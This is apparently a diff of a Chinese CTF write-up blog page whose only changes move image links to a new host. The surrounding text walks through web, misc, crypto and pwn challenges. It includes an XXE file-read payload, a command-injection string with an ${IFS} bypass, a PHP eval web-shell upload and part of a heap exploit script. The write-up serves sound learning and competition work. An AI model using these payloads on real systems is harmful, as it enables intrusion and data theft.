@@ -111,7 +111,7 @@
 	<div class='post-body mb'>
 		<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="小明又被拒绝了"><a href="#小明又被拒绝了" class="headerlink" title="小明又被拒绝了"></a>小明又被拒绝了</h3><p>这题比较简单，xff+改cookie</p>
 <p>payload:</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15680897504108.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15680897504108.png" alt="img"></p>
 <h3 id="XX"><a href="#XX" class="headerlink" title="XX?"></a>XX?</h3><ul>
 <li><p><strong>源码泄露</strong></p>
 </li>
@@ -134,7 +134,7 @@ echo &quot;CTF:&quot; . &quot;&lt;br&gt;&quot; . &quot;$user&quot;;
 </li>
 <li><p>xxe直接打，另外扫描到flag.php</p>
 </li>
-<li><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/1568090057222.png" alt="img"></p>
+<li><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/1568090057222.png" alt="img"></p>
 </li>
 <li><p>PHP伪协议直接读flag</p>
 <pre><code class="shell">GET /index.php HTTP/1.1
@@ -156,13 +156,13 @@ Content-Length: 227
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" ><p>]&gt;<br><creds><br><user>&xxe;</user><br><pass>&xxe;</pass><br></creds></p>
 <pre><code>
-![img](https://www.mycute.cn/static/umeditor/php/upload/20190910/15680912975437.png)
+![img]( http://goodcheerleung.gitee.io/mycute/20190910/15680912975437.png)
 
 ### 免费的,ping一下~
 
 - Fuzz出来一个payload`a;id;`可以用
 
-![img](https://www.mycute.cn/static/umeditor/php/upload/20190910/15680918202057.png)
+![img]( http://goodcheerleung.gitee.io/mycute/20190910/15680918202057.png)
 
 -  ${IFS}绕过空格
 -  pyload
@@ -224,7 +224,7 @@ $flag=&quot;flag{3904c5df2e894ca02a21004feb21e617}&quot;
 <h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><ul>
 <li>扫描目录从胡发现有个api目录，然后需要我们post提交一个filename而且是json格式的。经过一顿Fuzz出来一个<code>payload</code>可用：</li>
 </ul>
-<pre><code>filename={&quot;file&quot;:&quot;index.php&quot;}</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15680951435613.png" alt="img"></p>
+<pre><code>filename={&quot;file&quot;:&quot;index.php&quot;}</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15680951435613.png" alt="img"></p>
 <ul>
 <li>尝试使用双url编码去绕过<code>stristr</code>均以失败告终，后面去读根目录下的<code>index.php</code>发现源码：</li>
 </ul>
@@ -311,8 +311,8 @@ file_put_contents($path, $text);
 <pre><code>fffffaa_not.php?jhh08881111jn[]=%3C?php%20@eval($_POST[%27sb%27]);?%3E&amp;file_na=110114</code></pre><ul>
 <li>上菜刀在根目录下直接读取flag</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15680963492951.png" alt="img"></p>
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="完美的错误"><a href="#完美的错误" class="headerlink" title="完美的错误"></a>完美的错误</h3><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15681011438130.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15680963492951.png" alt="img"></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="完美的错误"><a href="#完美的错误" class="headerlink" title="完美的错误"></a>完美的错误</h3><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681011438130.png" alt="img"></p>
 <p>尝试多次发现base58将表移位</p>
 <p>脚本:</p>
 <pre><code class="python">import base58
@@ -348,14 +348,14 @@ for i in range(len(old_base58_table)):
     if &#39;flag&#39; in base58.b58decode(s):
 
         print base58.b58decode(s)    </code></pre>
-<h3 id="抓灰阔"><a href="#抓灰阔" class="headerlink" title="抓灰阔"></a>抓灰阔</h3><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/1568102716733.png" alt="img"></p>
+<h3 id="抓灰阔"><a href="#抓灰阔" class="headerlink" title="抓灰阔"></a>抓灰阔</h3><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/1568102716733.png" alt="img"></p>
 <p>用wireshark导出http文件发现main(13)与main.jsp%3fpass=281文件有AES的密文密钥</p>
 <p>扔去网站解密</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15681012317855.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681012317855.png" alt="img"></p>
 <p>发现提示，将后面内容复制base64解密转存发现是个ELF文件但是文件头不齐，将文件头补齐后，拉入ida分析</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15681013133626.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681013133626.png" alt="img"></p>
 <p>将指定字符串输入后得到flag</p>
-<pre><code>oo8?989j5i8;jh8&gt;;:=8n;ij:mij8;o4&quot;</code></pre><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15681027436525.png" alt="img"><br>题目已经提示了开头的字符，虽然生成了两个随机字符串，但是新生成的字符串是由前一个字符串异或得到，通过开头字符可求得随机字符串key。</p>
+<pre><code>oo8?989j5i8;jh8&gt;;:=8n;ij:mij8;o4&quot;</code></pre><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681027436525.png" alt="img"><br>题目已经提示了开头的字符，虽然生成了两个随机字符串，但是新生成的字符串是由前一个字符串异或得到，通过开头字符可求得随机字符串key。</p>
 <p>脚本:</p>
 <pre><code class="python">import os
 from Crypto.Util.number import long_to_bytes,bytes_to_long
@@ -387,15 +387,15 @@ def decode():
     +long_to_bytes(bytes_to_long(key)^filemessage2[6])
 decode()</code></pre>
 <h3 id="脑筋急转弯"><a href="#脑筋急转弯" class="headerlink" title="脑筋急转弯"></a>脑筋急转弯</h3><p>这题是一道音频隐写的题目，用silenteye提取出文件</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15681233241246.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681233241246.png" alt="img"></p>
 <p>发现该压缩包有密码，于是用Ziperello破解</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15681233775303.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681233775303.png" alt="img"></p>
 <p>解压出来是012的文件</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15681234098452.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681234098452.png" alt="img"></p>
 <p>由该题目的标题联想到brainfuck的语言，于是将0转成  .  将1转成 ! 将2转成?</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15681234389077.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681234389077.png" alt="img"></p>
 <p>于是用<a href="https://www.splitbrain.org/services/ook在线转换" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook在线转换</a></p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15681234757302.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681234757302.png" alt="img"></p>
 <p><strong>flag{08277716193eda6c592192966e9d6f39}</strong></p>
 <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h3><p>一开始拿着2.23的libc埋头做，利用条件竞争加上unsorted bin attack改fastbin的最大限制，free的时候所有的chunk都可以进入fastbin，但是改了之后unsorted bin坏了，因为创建进程要0x120的空间，所以就不能用条件竞争改fastbin的fd，那时候想了好久如何绕过这个限制，后来libc换成2.27的时候就容易多了，先free 7个chunk进入tcache将其填满，然后再free进入unsorted bin，利用run函数泄露内存，接着直接用条件竞争该tcache的fd为malloc hook的位置就行了，因为2.27的版本下没有过多的检查，然后将malloc hook改成one_gadget，最后malloc的时候会调用malloc hook的函数，执行one_gadget。</p>
 <pre><code>from pwn import*
@@ -509,7 +509,7 @@ p.recvuntil(&#39;index:\n&#39;)
 p.sendline(str(13))
 p.interactive()
 
-</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190910/15681235096326.png" alt="img"></p>
+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681235096326.png" alt="img"></p>
 <p><strong>flag{85B367076A1B7177F0F2945DA9DFE599}</strong></p>
 
 	</div>
